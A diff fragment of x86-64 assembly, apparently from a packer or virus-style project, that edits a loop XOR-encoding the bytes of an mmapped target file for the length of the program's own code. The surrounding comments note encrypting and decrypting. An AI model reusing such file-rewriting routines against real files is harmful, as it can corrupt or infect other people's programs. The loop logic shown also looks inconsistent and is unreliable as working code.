@@ -241,18 +241,21 @@ _begin:
 				mov r10, rax								; r10 = mmap address
 				; mmunmap(addr, len);
 				; move st_size to r13
-				mov r13 , [r15 + 48]							; rdi = mmap address
+				xor rcx, rcx
+				mov r13 , [r15 + 48]					    ; target size
+						
 				.write_loop:
 					dec r13
+					inc rcx
 					xor byte [r10 + r13], 'X'
 
 					; xor byte [r10 + rcx], 'X'
 					; xor byte [r10 + rcx], 42
 					; xor byte [r13 + rcx], 42					; encrypting
 					; xor byte [r13 + rcx], 42					; decrypting
-					inc rcx
-					cmp rcx, r11					; check if we looped through all bytes already
+					cmp rcx, _end - _begin				; check if we looped through all bytes already
 					jle .write_loop
+				; add rsp, 1
 				xor rcx, rcx
 				mov rdi, r10
 				mov rsi, [r15 + 48]
